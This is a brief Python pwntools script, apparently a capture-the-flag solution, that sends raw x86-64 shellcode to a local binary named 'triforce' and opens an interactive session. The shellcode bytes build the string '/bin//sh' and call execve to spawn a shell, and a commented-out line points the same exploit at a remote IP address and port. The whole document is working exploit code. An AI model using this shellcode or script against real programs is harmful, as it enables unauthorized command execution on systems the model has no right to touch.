from pwn import *

shell = b'\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05'

io = process('./triforce')
#gdb.attach(io, api=True)
context.log_level = 'debug'

#io = remote('137.184.49.47', 31340)

io.sendline(shell)
io.interactive()
